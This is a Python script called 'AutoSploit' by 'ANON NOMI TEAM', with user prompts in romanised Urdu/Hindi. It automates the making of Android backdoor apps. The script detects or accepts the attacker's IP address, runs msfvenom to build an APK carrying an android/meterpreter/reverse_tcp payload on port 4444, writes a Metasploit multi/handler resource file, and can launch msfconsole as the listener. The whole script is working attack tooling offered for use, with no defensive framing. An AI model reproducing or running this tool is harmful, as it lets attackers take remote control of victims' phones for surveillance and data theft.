import os
import subprocess


def condition():
    ans = input("aap listener start krna chahte hain 'haan' ya 'nahi' ? \n")
    if ans == "haan":
        os.system("msfconsole -r " + name + ".rc")


    elif ans == "nahi":

        print(f"\ncommands '{name}.rc' ki file me save hain ")
        print("file run krne k liye 'msfconsole -r " + name + ".rc' ki command dain")


os.system("clear")
print("""\u001b[31m    _         _       ____        _       _ _   
   / \  _   _| |_ ___/ ___| _ __ | | ___ (_) |_ 
  / _ \| | | | __/ _ \___ \| '_ \| |/ _ \| | __|
 / ___ \ |_| | || (_) |__) | |_) | | (_) | | |_ 
/_/   \_\__,_|\__\___/____/| .__/|_|\___/|_|\__|
     \u001b[37mBY ANON NOMI TEAM     \u001b[31m|_|                  
\u001b[0m""")

main = int(input("1. for LAN apk\n2. for IPJETABLE (over wan) apk\n3. for static ip (over wan) apk\n\n"))

name1 = input("naam likhen jis naam se aap apk file bnana chahte hain\n")
name2 = name1.split(".")
name = name2[0]


if main == 1:
    ip1 = subprocess.check_output("ifconfig wlan0 | grep -w inet | awk '{print $2}'", shell=True)

    if ip1 is (b''):
        ip1 = subprocess.check_output("ifconfig rmnet_data0 | grep -w inet | awk '{print $2}'", shell=True)

    if ip1 is (b''):
        ip1 = subprocess.check_output("ifconfig eth1 | grep -w inet | awk '{print $2}'", shell=True)

    if ip1 is (b''):
        ip1 = subprocess.check_output("ifconfig eth0 | grep -w inet | awk '{print $2}'", shell=True)

    if ip1 is not (b''):
        ip1 = ip1

if main == 2:

    ip1 = subprocess.check_output("ifconfig ppp0 | grep -w inet | awk '{print $2}'", shell=True)

    if ip1 is not (b''):
        ip1 = ip1

if main == 3:
    sip = input("Apna static ip dalen\n")
    ip = sip

try:
    ip2 = str(ip1).split("'")

    with open("auto.txt", "w") as file1:
        file1.write(ip2[1])

    with open("auto.txt", "rb+") as file1:
        file1.seek(-2, os.SEEK_END)
        file1.truncate()

    with open("auto.txt", "r") as file1:
        ip = file1.read()
        print(f"\napki ip hai : {ip}")

except NameError:
    print(f"apka dynamic dns address hai: {ip}")
except OSError:
    print("ipjetable connect nhi hai aage process nhi ho sakta")
    exit()

with open(f"{name}.rc", "w") as file2:
    file2.write("""use exploit/multi/handler
set payload android/meterpreter/reverse_tcp\n"""
f"set lhost {ip}\n"
"""set lport 4444
exploit -j""")

try:
    os.makedirs("/sdcard/autosploit")
    os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + ip + " lport=4444 -o /sdcard/autosploit/" + name + ".apk")
    print(f"apki file '/sdcard/autosploit/{name}' me save hai")
except PermissionError:
    os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + ip + " lport=4444 -o " + name + ".apk")
    print(f"apki file '{name}.apk' k name se save hai")
except FileExistsError:
    os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + ip + " lport=4444 -o /sdcard/autosploit/" + name + ".apk")
    print(f"apki file '/sdcard/autosploit/{name}' me save hai")


condition()
os.remove("auto.txt")




